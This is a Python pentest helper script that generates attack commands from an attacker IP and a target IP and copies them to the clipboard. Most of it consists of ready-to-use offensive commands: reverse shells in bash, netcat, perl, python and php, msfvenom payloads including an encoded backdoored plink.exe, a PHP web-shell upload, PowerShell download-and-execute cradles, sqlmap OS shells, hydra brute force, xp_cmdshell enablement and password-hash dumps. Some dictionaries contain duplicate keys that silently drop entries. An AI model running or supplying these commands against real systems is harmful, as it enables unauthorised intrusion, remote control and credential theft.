#!/usr/bin/env python3.6
import argparse
import pyperclip

# import only system from os 
from os import system, name 

parser = argparse.ArgumentParser(description='Program created by eRaMvn. This program generates commands for pentesters to avoid mistakes during an engagement', 
    usage='%(prog)s source_ip [-lp your_local_port] target_ip [-d directory_to_store_file]')
parser.add_argument('source', metavar=" [source ip]", help="source ip address - usually attacker's ip address")
parser.add_argument('target', metavar=" [target ip]", help="target's ip address")
parser.add_argument('-lp', type=int, metavar="[port]", default=443, help='local port to listen to. Default port is 443')
parser.add_argument('-d', metavar="[directory]", default="~/Desktop", help='directory where files can be stored')
parser.add_argument('-v', action='version', version='%(prog)s version 1.1')

args = parser.parse_args()
source_ip = args.source
local_port = args.lp
target_ip = args.target
store_directory = args.d

"""
Implement clear screen, add impacket
Eliminate the / at the end of directory
"""
if store_directory[-1] == "/":
    store_directory = store_directory[:-1]

# define our clear function 
def clear(): 
  
    # for windows 
    if name == 'nt': 
        _ = system('cls') 
  
    # for mac and linux(here, os.name is 'posix') 
    else: 
        _ = system('clear') 

def tools(listoftools):
    for tool in sorted(listoftools):
        print(tool, end=' / ')
    print('\n')
    print("-" * 70)

def copy_to_clipboard(options):
    # Print out all of the commands
    for key in options:
        print("---" + options[key][0] + "---")
        print(str(key) + ". " + options[key][1])
        print("-" * 70)

    print('Please select commmand number to copy to clipboard. Type "0" to return to tool selection, "c" to clear screen. ')
    while True:
        try:
            choice = input("Input: ").strip()
            if choice == "0" or choice == "b" or choice == "back" or choice == "exit":
                print("-" * 70)
                print("Taking you back to tool selection!")
                print("-" * 70)
                break
            elif choice == "c" or choice == "clear":
                clear()
                print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
            elif choice == "l" or choice == "list":
                for key in options:
                    print("---" + options[key][0] + "---")
                    print(str(key) + ". " + options[key][1])
                    print("-" * 70)
            elif int(choice) > len(options) or int(choice) < 0:
                print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
            else:
                #Copy command to clipboard
                pyperclip.copy(options[int(choice)][1])
                print("It has been copied to your clipboard!")
                print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
        except:
            print(f'Please enter an integer from 0 to {len(options)}. 0 to return, "l" to list options, "c" to clear screen.')
           

def get_url():
    choice = input("Input: ").strip()
    return choice

def nmap():
    print("Please enter the port for nmap to scan. Leave blank to use default")
    ports = input("Input: ").strip()
    if ports == "":
        ports = "[edit port]"
    options = {1 : ["nmap phase 1", f"nmap -sSV -Pn -nvv -p- --reason -T4 -oN {store_directory}/{target_ip}_nmap_tcp_ports.txt {target_ip}"],
        2: ["nmap phase 2", f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_nmap_detailed.txt {target_ip}"],
        3: ["nmap phase 3", f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_nmap_vuln_scan.txt {target_ip}"],
        4: ["nmap udp scan", f"nmap -Pn -p- -sU --stats-every 3m --max-retries 2 -T4 -oN {store_directory}/{target_ip}_nmap_udp_ports.txt {target_ip}"],
        5: ["nmap example script usage", f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_nmap_firewalk.txt {target_ip}"],
    }

    copy_to_clipboard(options)

def hydra():
    print("Please enter request from burp. Leave blank to use default")
    request = get_url()

    print("Please enter user list location")
    user_list = input("Input: ").strip()

    print("Please enter password list location")
    pass_list = input("Input: ").strip()

    print("Please error message. Leave blank to use default")
    error = input("Input: ").strip()

    options = {1 : ["hydra post request brutefroce", f'hydra -L {user_list} -P {pass_list} {target_ip} http-post-form "{request}:{error}" -V -I'],
        1 : ["hydra rdp request brutefroce", f'hydra -t 2 -V -f -L {user_list} -I -P {pass_list} rdp://{target_ip}'],
        2 : ["hydra ftp brutefroce", f'hydra -t 4 -V -L {user_list} -I -P {pass_list} ftp://{target_ip}'],
        3 : ["hydra vnc brutefroce", f'hydra -L {user_list} -P {pass_list}  -t 1 -w 5 -f -s 5900 {target_ip} vnc -v'],
        4 : ["hydra ssh brutefroce", f'hydra -L {user_list} -P {pass_list} {target_ip} ssh'],
    }

    copy_to_clipboard(options)

def gobuster():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    print("Please enter word list location (Default: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt). Leave blank to use default")
    word_list = input("Input: ").strip()
    if word_list == "":
        word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

    options = {1 : ["Linux server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .php,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster.txt"],
        2 : ["Windows server", f"gobuster -u http://{url}:80 -w {word_list} -t 100 -x .asp,.aspx,.html,.txt -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster.txt"],
        3 : ["cgi-bin directory", f"gobuster -u http://{url}:80/cgi-bin -w {word_list} -t 100 -x .pl,.sh -s '200,204,301,302,307,401,403' -e -o {store_directory}/{url}_gobuster_cgi.txt"],
    }

    copy_to_clipboard(options)

def nikto():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    options = {1 : ["Scan everything with nikto", f"nikto -h http://{url} | tee {store_directory}/{url}_nikto.txt"],
    }
    
    copy_to_clipboard(options)

def unicorn():
    print("Please enter the url to scan not including http (Default: Target's IP address). Leave blank to use default")
    url = get_url()
    if url == "":
        url = target_ip

    options = {1 : ["TCP scan", f"unicornscan -pa {url} | tee {store_directory}/{url}_unicorn_tcp.txt"],
        2 : ["UDP scan", f"unicornscan -pa -mU {url} | tee {store_directory}/{url}_udp_ports.txt"],
    }
    
    copy_to_clipboard(options)

def curl():
    print("Please enter the url. Leave blank to use default")
    url = get_url()
    if url == "":
        url = "http://192.168.25.55:11443/examples/test.jsp"
    
    options = {1 : ["Upload file with curl", f"curl -i -T /root/Desktop/test.jsp {url}"],
        2 : ["Upload file with PUT option", f"""curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' {url}"""],
        3 : ["Grab Headers and spoof user agent", f"""curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" {url}"""],
        4 : ["Scrape site after login", f"""curl -u user:pass -o outfile {url}"""],
    }
    
    copy_to_clipboard(options)

def rdesktop():
    user = input("Enter username: ").strip()
    password = input("Enter password: ").strip()
    options = {1 : ["rdp with full screen", f"rdesktop -u {user} -p {password} {target_ip} -f"],
    }
    
    copy_to_clipboard(options)

def ssh():
    user = input("Enter username: ").strip()
    options = {1 : ["Create a SSH connection", f"ssh {user}@{target_ip} -p 22"],
        2 : ["Dynamic port forwarding", f"ssh -ND 9050 {user}@{target_ip} -p 22"],
        3 : ["SSH with private key", f"ssh -i [key file] {user}@{target_ip}"],
        4 : ["Local port forwarding", f"ssh -CNL 81:{source_ip}:80 {user}@{source_ip} -p 22"],
        5 : ["Remote port forwarding", f"ssh -CNR 81:localhost:80 {user}@{target_ip} -p 22"],
    }
    
    copy_to_clipboard(options)

def nc():
    while True:
        try:
            target_port = int(input("Please enter the port listening on the target: ").strip())
        except:
            print("Enter an integer for a port")
        else:
            options = {1 : ["Reverse shell on linux target", f"nc -nv {source_ip} {local_port} -e /bin/bash"],
                2 :["Reverse shell on windows target", f"nc -nv {source_ip} {local_port} -e cmd.exe"],
                3 : ["Reverse shell listener", f"nc -nvlp {local_port}"],
                4 : ["Bind shell listener on windows target", f"nc -lvp {target_port} -e cmd.exe"],
                5 : ["Bind shell connect", f"nc -nv {target_ip} {target_port}"],
                6 : ["Transfer file with nc at destination", f"nc -l -p {target_port} > out.file"],
                7 : ["Transfer file with nc at source", f"nc -w 3 [destination] {target_port}< out.file"],
                8 : ["Transfer compressed file with nc at destination", f"nc -l -p {target_port} | uncompress -c | tar xvfp -"],
                9 : ["Transfer compressed file with nc at source", f"tar cfp - /some/dir | compress -c | nc -w 3 [destination] {target_port}"],
            }
            break
    
    copy_to_clipboard(options)

def msfvenom():
    options = {1 : ["Generate reverse shell executable on linux", f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell"],
        2 : ["Generate metepreter reverse shell executable on linux", f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell"],
        3 : ["Generate reverse shell code on windows", f'msfvenom -p windows/x86/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} EXITFUNC=thread -b "\x00\x0a" -f python -v payload > shell'],
        4 : ["Generate metepreter reverse shell executable on windows", f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={source_ip} LPORT={local_port} -f asp > shell.asp"],
        5 : ["Generate reverse shell in php", f"msfvenom -p php/reverse_php LHOST={source_ip} LPORT={local_port} -f raw > shell1.phpD.png"],
        6 : ["Generate reverse shell in java", f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f raw > shell.jsp"],
        7 : ["Embed shell code to plink.exe", f"msfvenom -p windows/shell_reverse_tcp LHOST={source_ip} LPORT={local_port} -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o plink_extra.exe"],       
    }
    
    copy_to_clipboard(options)

def smbclient():
    var = """\\"""
    options = {1 : ["Sample usage 1", f"smbclient -L {target_ip}"],
        2 : ["Sample usage 2", f'smbclient "\\\\\\{var}{target_ip}\<sharename>"'],
        3 : ["Sample usage 3", f'smbclient -U <username> //{target_ip}/<sharename>'],
        4 : ["Sample usage 4", f'smbclient //MOUNT/<sharename> -I {target_ip} -N'],
    }
    
    copy_to_clipboard(options)

def cewl():
    print("Please enter the url. Leave blank to use default")
    url = get_url()

    options = {1 : ["Get all words on a page", f"cewl {url} -w {store_directory}/{target_ip}_cewl.txt"],
    }
    
    copy_to_clipboard(options)

def wpscan():
    print("Please enter the url. Leave blank to use default")
    url = get_url()

    options = {1 : ["Standard wpscan", f"/usr/share/wpscan/wpscan.rb --url {url} --enumerate --log wpscan-{target_ip}"],
    }
    
    copy_to_clipboard(options)

def sshuttle():
    options = {1 : ["Sample sshutle usage", f"shuttle -r joe@10.11.1.252:22 10.2.2.0/24"],
    }
    
    copy_to_clipboard(options)

def sqlmap():
    print("Please enter the url. Leave blank to use default")
    url = get_url()
    if url == "":
        url = "http://10.11.12.108/comment.php?id=738"

    options = {1 : ["Standard sqlmap scan", f"sqlmap -r request_file --level 5 --risk 3 --dbms=mysql --dump --batch"],
        2 : ["Get shell with sqlmap", f"sqlmap -u {url} --dbms=mysql --os-shell"],
    }
    
    copy_to_clipboard(options)

def shell():
    options = {1 : ["Reverse shell with bash", f"bash -i >& /dev/tcp/{source_ip}/{local_port} 0>&1"],
        2 : ["Reverse shell with perl", """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (source_ip, local_port)],
        3 : ["Reverse shell with python", f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{source_ip}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""],
        4 : ["Reverse shell with php", f"""php -r '$sock=fsockopen("{source_ip}",{local_port});exec("/bin/bash -i <&3 >&3 2>&3");'"""],
        5 : ["Reverse shell with mkfifo", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {source_ip} {local_port} >/tmp/f"],
        6 : ["Reverse shell with xterm", f"xterm -display {source_ip}:1"],
        7 : ["Spawn tty shell with python", f"""python -c 'import pty; pty.spawn("/bin/bash")'"""],
    }
    
    copy_to_clipboard(options)

def mysql():
    user = input("Enter username: ").strip()
    password = input("Enter password: ").strip()

    options = {1 : ["Sign in to mysql", f"mysql -u{user} -{password} -h {target_ip}"],
        2 : ["Hostname & IP", f"SELECT @@hostname;"],
        3 : ["Hostname & IP", f"SELECT @@hostname;"],
        4 : ["Current DB", f"SELECT database();"],
        5 : ["List DBs", f"SELECT distinct (db) FROM mysql.db;"],
        6 : ["Current user", f"SELECT user();"],
        7 : ["List users", f"SELECT username FROM mysql.user;"],
        8 : ["List password hashes", f"SELECT host,user,password FROM mysql.user;"],
        9 : ["List all tables and columns", f"SELECT table schema, table name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"],
        10 : ["Execute OS command through mysql", f"""osql -S {target_ip}, port -U sa -P {password} -Q "exec xp_cmdshell 'command''"""],
        11 : ["Write to file system", f"SELECT * FROM mytable INTO dumpfile '{store_directory}/somefile';"],
    }
    
    copy_to_clipboard(options)

def dig():
    options = {1 : ["Zone transfer with dig", f"dig axfr @{target_ip} [domain name]"],
    }
    
    copy_to_clipboard(options)

def enum4linux():
    options = {1 : ["All options with enum4linux", f"enum4linux -a {target_ip} | tee {store_directory}/{target_ip}_enum.txt"],
    }
    
    copy_to_clipboard(options)

def smtp_user_enum():
    options = {1 : ["Sample usage", f"smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t {target_ip}"],
    }
    
    copy_to_clipboard(options)

def mount():
    options = {1 : ["Mount nfs share", f"mount -t nfs {target_ip}:/home/vulnix /tmp/[folder]"],
        2 : ["Mount share on windows", f"mount -t cifs -o username=[user] //{target_ip}/[sharename] /tmp/[folder]"],
    }
    
    copy_to_clipboard(options)

def plink():
    options = {1 : ["Sample usage", f"plink.exe -l root -pw aBc123% -R 9090:127.0.0.1:9090 10.11.0.156 -P 80"],
    }
    
    copy_to_clipboard(options)

def tcpdump():
    options = {1 : ["Sample usage (listening to port 110)", f"tcpdump -nnvvs -i any port 110 -w test.pcap"],
        2 : ["Capture HTTP header", f"tcpdump -nnvvvs 1024 -i any -A -w test.pcap"],
        3 : ["Capture icmp packets", f"tcpdump -ni any icmp[icmptype]=icmp-echo"],
        4 : ["Sample rule set", f"tcpdump -i tun0 'src host [ip] and tcp[tcpflags]==tcp-syn'"],
    }
    
    copy_to_clipboard(options)

def powershell():
    options = {1 : ["Download and execute powershell script in cmd", f"powershell IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
        2 : ["Forcing powershell version 2", f"powershell -version 2 IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
        3 : ["Download and execute powershell script", f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
        4 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
    }
    
    copy_to_clipboard(options)


def tar():
    options = {1 : ["Create tar from files", f"tar cf file.tar files"],
        2 : ["Extract .tar", f"tar xf file.tar"],
        3 : ["Create .tar.gz", f"tar czf file.tar.gz files"],
        4 : ["Extract .tar.gz", f"tar xzf file.tar.gz"],
        5 : ["Create .tar.bz2", f"tar cjf file.tar.bz2 files"],
        6 : ["Extract .tar.bz2", f"tar xjf file.tar.bz2"],
    }
    
    copy_to_clipboard(options)

def mssql():
    options = {1 : ["DB version", f"SELECT @@version;"],
        2 : ["Detailed version info", f"EXEC xp_msver"],
        3 : ["Run OS command", f"EXEC master..xp_cmdshell 'command'"],
        4 : ["List DBs", f"SELECT name FROM master..sysdatabases;"],
        5 : ["Current user", f"SELECT user name();"],
        6 : ["List users", f"SELECT name FROM master..syslogins;"],
        7 : ["List columns", f"SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='mytable';"],
        8 : ["Set advanced options", f"EXEC SP_CONFIGURE 'show advanced options', 1"],
        9 : ["Set xp_cmdshell", f"EXEC_SP_CONFIGURE 'xp_cmdshell', 1"],
    }
    
    copy_to_clipboard(options)

def postgres():
    options = {1 : ["DB version", f"SELECT version();"],
        1 : ["Hostname & IP", f"SELECT inet server_addr();"],
        2 : ["Current DB", f"SELECT current database();"],
        3 : ["List DBs", f"SELECT datname FROM pg database;"],
        4 : ["Current user", f"SELECT user;"],
        5 : ["List users", f"SELECT username FROM pg_user;"],
        6 : ["List password hashes", f"SELECT username,passwd FROM pg_shadow;"],
    }
    
    copy_to_clipboard(options)

def wfuzz():
    options = {1 : ["Sample usage", f"wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://{target_ip}/FUZZ"],
    }
    
    copy_to_clipboard(options)

def runas():
    options = {1 : ["Sample usage", r"""runas /profile /savedcred /user:ACCESS\Administrator 'cmd.exe /c whoami > C:\temp\test.txt'"""],
    }
    
    copy_to_clipboard(options)

def impacket():
    options = {1 : ["psexec sample usage", f'psexec.py HTB.local/[username]@{target_ip} "cmd.exe"'],
        2 : ["GetUserSPNs.py sample usage", f'GetUserSPNs.py <domain>/[username][:password] -dc-ip <ip>'],
    }
    
    copy_to_clipboard(options)

def linux():
    options = {1 : ["Service", f"/etc/init.d"],
        2 : ["Network configuration", "/etc/network/interfaces"],
        3 : ["Nameserver configuration", "/etc/resolv.conf"],
        4 : ["RHEL / Red Hat / CentOS / Fedora Linux Apache access file location", "/var/log/httpd/access_log"],
        5 : ["Debian / Ubuntu Linux Apache access log file location ", "/var/log/apache2/access.log"],
        6 : ["FreeBSD Apache access log file location", "/var/log/httpd-access.log"],
        7 : ["RHEL / Red Hat / CentOS / Fedora Linux Apache error file location", "/var/log/httpd/error_log"],
        8 : ["Debian / Ubuntu Linux Apache error log file location ", "/var/log/apache2/error.log"],
        9 : ["FreeBSD Apache error log file location", "/var/log/httpd-error.log"],
    }
    
    copy_to_clipboard(options)

def windows():
    options = {1 : ["Service", f"/etc/init.d"],
        2 : ["Windows version", f"c:\WINDOWS\system32\eula.txt"],
        3 : ["Boot.ini", r"""c:\boot.ini"""],
        4 : ["win.ini #1", "c:\WINDOWS\win.ini"],
        5 : ["win.ini #2", "c:\WINNT\win.ini"],
        6 : ["SAM backup", "c:\WINDOWS\Repair\SAM"],
        7 : ["php.ini #1", "c:\WINDOWS\php.ini"],
        8 : ["php.ini #2", "c:\WINNT\php.ini"],
        9 : ["php.ini #3", r"""c:\home\bin\stable\apache\php.ini"""],
        10 : ["httpd.conf #1", """c:\Program Files\Apache Group\Apache\conf\httpd.conf"""],
        11 : ["httpd.conf #2", """c:\Program Files\Apache Group\Apache2\conf\httpd.conf"""],
        12 : ["httpd.conf #3", r"""c:\Program Files\xampp\apache\conf\httpd.conf"""],
    }
    
    copy_to_clipboard(options)

def change(source, target, port):
    source_ip = source
    target_ip = target
    local_port = port
    while True:
        print('Please type "source" to change source ip, "target" to change target ip, "port" to change port, "c" to clear screen, "b" to go back')
        choice = input('Input: ').strip()
        if choice == "source":
            source_ip = input("Please enter the new source ip: ").strip()
            print("Source IP changed!")
        elif choice == "target": 
            target_ip = input("Please enter the new target ip: ").strip()
            print("Target IP changed!")
        elif choice == "port":
            local_port = int(input("Please enter the source port: ").strip())
            print("Source port changed!")
        elif choice == "b" or choice == "back":
            return (source_ip, target_ip, local_port)
        elif choice == "c" or choice == "clear":
            clear()
        else:
            continue

# map the inputs to the function blocks
options = {"nmap" : nmap,
           "hydra" : hydra,
           "gobuster" : gobuster,
           "nikto" : nikto,
           "unicorn" : unicorn,
           "curl" : curl,
           "rdesktop" : rdesktop,
           "ssh" : ssh,
           "nc" : nc,
           "msfvenom" : msfvenom,
           "smbclient" : smbclient,
           "cewl" : cewl,
           "wpscan": wpscan,
           "sshuttle": sshuttle,
           "sqlmap": sqlmap,
           "shell" : shell,
           "mysql" : mysql,
           "dig" : dig,
           "enum4linux": enum4linux,
           "smtp-user-enum": smtp_user_enum,
           "mount": mount,
           "plink": plink,
           "tcpdump": tcpdump,
           "powershell": powershell,
           "tar": tar,
           "mssql": mssql,
           "postgres": postgres,
           "wfuzz" : wfuzz,
           "runas" : runas,
           "impacket" : impacket,
}

systems = {"windows" : windows, "linux" : linux}

while True:
    print("You are currently in tool selection mode.  Please choose commmand to generate.")
    print('Otherwise, type "l" to list tools supported, "s" for interesting system files, "ch" to change ips and ports, "c" to clear screen, "e" to quit program.')
    choice = input("Input: ").strip()
    
    if choice == "l" or choice == "list":
        print("-" * 70)
        print("This program currently supports the following tools:")
        print("-" * 70)
        tools(options)
    elif choice == "c" or choice == "clear":
        clear()
    elif choice == "s" or choice == "system":
        print("-" * 70)
        while True:
            print('Enter "linux" for linux, "windows" for windows, "c" to clear screen, "b" to return.')
            selection = input('Input: ').strip()
            if selection == "b" or selection == "back":
                break
            elif selection == "linux" or selection == "windows":
                systems[selection]()
                break
            elif selection == "c" or selection == "clear":
                clear()
            else:
                print("Unrecognized input!")
    elif choice == "ch" or choice == "change":
        source_ip, target_ip, local_port = change(source_ip, target_ip, local_port)
    elif choice == "e" or choice == "exit":
        print("Bye!")
        break
    elif choice not in options:
        print(f'This tool "{choice}" is not supported yet!')
        print("This program currently supports the following tools:")
        print("-" * 70)
        tools(options)
    else:
        options[choice]()
